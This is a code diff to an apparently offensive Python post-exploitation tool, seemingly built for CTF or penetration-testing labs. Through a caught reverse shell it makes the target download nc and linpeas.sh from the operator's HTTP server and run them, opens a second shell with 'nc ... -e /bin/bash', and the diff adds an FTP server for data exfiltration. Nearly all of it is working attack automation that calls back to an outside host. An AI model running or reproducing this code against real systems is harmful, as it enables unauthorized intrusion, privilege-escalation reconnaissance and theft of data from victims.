@@ -13,15 +13,17 @@ def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-p", "--port", help="Listen port for the reverse shell", type=int, default=4444)
     parser.add_argument("-lp", "--lport", help="Local port for the file server", type=int, default=9001)
-    parser.add_argument("-o", "--os", help="Currently not used", type=str, default="Linux")
     parser.add_argument("-i", "--interface", help="The interface to use", type=str, default="tun0")
+    parser.add_argument("-d", "--dport", help="The port to use for data exfiltration",
+                        type=int, default=None)
+    parser.add_argument("-o", "--os", help="Currently not used", type=str, default="Linux")
     args = parser.parse_args()
     return args
 
 
 
 def get_file(tmp_dir, ip, lport, p, filename):
-    p.sendline(f"wget http://{ip}:{lport}/{filename} -O {tmp_dir}/{filename}".encode())
+    p.sendline(f"wget http://{ip}:{lport}/www/{filename} -O {tmp_dir}/{filename}".encode())
     p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())
 
 
@@ -36,21 +38,15 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
     # Spawn the manual shell thread
     threading.Thread(target=manual_shell, args=(mport,)).start()
 
-    if os.path.exists("./linpeas.sh"):
-        print("The file exists")
-        p.sendline(f"mkdir {tmp_dir}".encode())
-        get_file(tmp_dir, ip, lport, p, "nc")
-        p.sendline(f"wget http://{ip}:{lport}/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
-        p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
-        p.sendline(f"cd {tmp_dir}".encode())
-        p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
-        # Linpeas will run in the background with the output redirected to a file and
-        # input from /dev/null and errors redirected to stdout
-        p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())
-
-    else:
-        print("The file doesn't exist on the local machine")
-
+    p.sendline(f"mkdir {tmp_dir}".encode())
+    get_file(tmp_dir, ip, lport, p, "nc")
+    p.sendline(f"wget http://{ip}:{lport}/www/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
+    p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
+    p.sendline(f"cd {tmp_dir}".encode())
+    p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
+    # Linpeas will run in the background with the output redirected to a file and
+    # input from /dev/null and errors redirected to stdout
+    p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())
     exit()
 
 
@@ -81,9 +77,75 @@ def get_ip_address(ifname):
     )[20:24])
 
 
+def checks(args):
+    # Sudo check if -d is used
+    if args.dport is not None:
+        if os.geteuid() != 0 and args.dport < 1024:
+            print(f"You need to have root privileges to run pyftpdlib on port {args.dport}.")
+            return False
+        else:
+            print(f"FTP Server will run on port {args.dport}")
+
+
+    # Check if linpeas is present
+    if os.path.exists("./www/linpeas.sh"):
+        print("The file exists")
+
+    else:
+        print("The file doesn't exist on the local machine")
+        # Prompt the user to download the file
+        download = input("Do you want to download the file? /!\ Might be outdated /!\ (y/n): ")
+        if download == "y":
+            # Download the file
+            os.system("wget https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O ./www/linpeas.sh")
+
+        else:
+            # Prompt to continue without linpeas
+            continue_without_linpeas = input("Do you want to continue without linpeas? (y/n): ")
+            if continue_without_linpeas == "y":
+                print("Continuing without linpeas")
+            else:
+                return False
+
+    # Check if correct nc is present
+    if os.path.exists("./www/nc"):
+        print("The nc is in the www folder")
+        return True
+    else:
+        p = process("/bin/bash")
+        p.sendline("nc -e".encode())
+        needle = "invalid option"
+        # read stdout if needle appears exit
+        if p.recvuntil(needle.encode()):
+            print("The current nc version is not compatible with the script")
+            print("Are you using kali? "
+                  "nc with the -e option is not present")
+            # Kill the process
+            p.kill()
+            return False
+        else:
+            print("The nc version is compatible")
+            # cppy the nc to the www folder
+            os.system("cp /bin/nc ./www/nc")
+            return True
+
+
+def data_exfiltration(dport):
+    p = process("/bin/bash")
+    print("Starting the ftp server...")
+    p.sendline(f"sudo python -m pyftpdlib -p 21 --write".encode())
+
+
 def main():
     # Parse the arguments
     args = parse_args()
+
+
+    # Check if linpeas is present
+    if not checks(args):
+        print("Exiting...")
+        exit()
+
 
     # Create a temporary directory
     tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
@@ -103,6 +165,9 @@ def main():
     threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip, mport)).start()
     # 2. Spawn the file server thread
     threading.Thread(target=file_server, args=(lport,)).start()
+    # 3. Spawn the data exfiltration thread
+    if args.dport:
+        threading.Thread(target=data_exfiltration, args=(args.dport,)).start()
 
 
 if __name__ == "__main__":
